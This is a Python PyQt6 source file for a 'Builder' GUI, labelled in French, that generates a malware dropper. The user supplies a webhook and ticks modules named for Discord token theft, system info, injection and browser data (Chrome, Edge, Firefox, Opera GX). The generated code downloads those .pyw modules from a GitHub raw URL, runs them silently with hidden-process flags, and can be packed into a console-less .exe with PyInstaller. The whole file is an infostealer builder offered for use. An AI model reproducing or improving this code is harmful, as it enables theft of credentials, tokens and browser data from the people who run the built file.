from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt
import sys, tempfile, subprocess, os

base_code = '''
import os, tempfile, requests, subprocess, random, string
webhook = "{WEBHOOK}"
pyw_urls = {
{URLS}
}

def generate_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".pyw"

temp = tempfile.gettempdir()
cfg = os.path.join(temp, "config")
whfile = os.path.join(cfg, "webhook.txt")

if not os.path.exists(cfg): os.makedirs(cfg)
if os.path.exists(whfile): os.remove(whfile)
with open(whfile, "w") as f: f.write(webhook)

for url, run in pyw_urls.items():
    path = os.path.join(temp, generate_filename())
    try:
        r = requests.get(url)
        if r.status_code == 200:
            with open(path, "wb") as f: f.write(r.content)
            if run: subprocess.Popen(["pythonw", path], creationflags=0x00000008 | 0x00000200)
    except: pass
'''

class Builder(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Builder")
        self.setFixedSize(450, 500)
        self.setStyleSheet("background:#1e1e1e;color:white;font:10pt Segoe UI;")
        layout = QVBoxLayout(self)

        self.webhook = QLineEdit()
        self.webhook.setPlaceholderText("Webhook")
        self.webhook.setStyleSheet("background:#2e2e2e;padding:6px;border-radius:5px;")
        layout.addWidget(self.webhook)

        self.files = {
            "info_pc": True, "token_discord": True,
            "injection": False, "chrome": False,
            "edge": False, "firefox": False, "opera-GX": False
        }

        self.checkboxes = {}
        for name, default in self.files.items():
            cb = QCheckBox(name)
            cb.setChecked(default)
            cb.setStyleSheet("padding:4px")
            layout.addWidget(cb)
            self.checkboxes[name] = cb

        btn = QPushButton("Générer le fichier")
        btn.setStyleSheet("padding:10px;background:#007acc;border:none;border-radius:5px;color:white;")
        btn.clicked.connect(self.show_build_options)
        layout.addWidget(btn, alignment=Qt.AlignmentFlag.AlignCenter)

    def generate_code(self):
        webhook = self.webhook.text()
        base_url = "https://raw.githubusercontent.com/theolomo/config/refs/heads/main/"
        urls = ''.join([f'    "{base_url}{name}.pyw": {cb.isChecked()},\n' for name, cb in self.checkboxes.items()])
        return base_code.replace("{WEBHOOK}", webhook).replace("{URLS}", urls.strip())

    def show_build_options(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Choisir une option")
        dialog.setFixedSize(300, 120)
        layout = QVBoxLayout(dialog)

        label = QLabel("Que veux-tu faire ?")
        label.setStyleSheet("font-weight:bold; padding: 10px;")
        layout.addWidget(label, alignment=Qt.AlignmentFlag.AlignCenter)

        btn_py = QPushButton("Générer en .py")
        btn_exe = QPushButton("Compiler en .exe")
        for btn in [btn_py, btn_exe]:
            btn.setStyleSheet("padding:6px;border-radius:4px;background:#3c3c3c;color:white;")
            layout.addWidget(btn)

        btn_py.clicked.connect(lambda: [dialog.accept(), self.build_py()])
        btn_exe.clicked.connect(lambda: [dialog.accept(), self.build_exe()])
        dialog.exec()

    def build_py(self):
        code = self.generate_code()
        path, _ = QFileDialog.getSaveFileName(self, "Enregistrer", "", "Python File (*.py)")
        if path:
            with open(path, "w", encoding="utf-8") as f: f.write(code)

    def build_exe(self):
        code = self.generate_code()
        tmp_py = os.path.join(tempfile.gettempdir(), "temp_build.py")
        with open(tmp_py, "w", encoding="utf-8") as f:
            f.write(code)

        exe_path = QFileDialog.getSaveFileName(self, "Enregistrer l'exe", "", "Executable (*.exe)")[0]
        if not exe_path:
            return

        cmd = f'pyinstaller --noconfirm --onefile --noconsole "{tmp_py}"'
        subprocess.call(cmd, shell=True)

        built_exe = os.path.join("dist", "temp_build.exe")
        if os.path.exists(built_exe):
            os.rename(built_exe, exe_path)

        for folder in ["build", "dist"]:
            if os.path.exists(folder):
                subprocess.call(f'rmdir /s /q {folder}', shell=True)
        if os.path.exists("temp_build.spec"):
            os.remove("temp_build.spec")

        QMessageBox.information(self, "Fini", "Compilation EXE terminée !")

app = QApplication(sys.argv)
win = Builder()
win.show()
sys.exit(app.exec())
